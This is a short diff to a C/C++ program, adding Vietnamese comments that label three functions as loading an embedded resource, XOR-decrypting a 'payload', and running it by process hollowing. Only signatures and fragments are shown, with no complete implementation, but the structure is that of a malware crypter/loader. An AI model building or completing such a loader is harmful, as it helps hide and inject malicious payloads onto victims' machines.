@@ -34,6 +34,7 @@ int main()
     return 0;
 }
 
+//  HAM DE LAY RESOURCE TRA VE MANG MA HEX
 unsigned char *GetResource(int resourceId, const char *resourceString, unsigned long *dwSize)
 {
     HGLOBAL hResData;
@@ -55,6 +56,7 @@ unsigned char *GetResource(int resourceId, const char *resourceString, unsigned 
     return nullptr;
 }
 
+//  HAM GIAI MA PAYLOAD BANG XOR
 char *DecryptResource(unsigned char *resourcePtr, unsigned long resourceSize, char key, unsigned long keySize)
 {
     // decrypt the resource raw data
@@ -65,6 +67,7 @@ char *DecryptResource(unsigned char *resourcePtr, unsigned long resourceSize, ch
     return decrypted;
 }
 
+//  PROCESS HOLLOWING
 bool RunPEResource(char *decryptedPE, unsigned long peSize)
 {
     IMAGE_DOS_HEADER *DOSHeader;
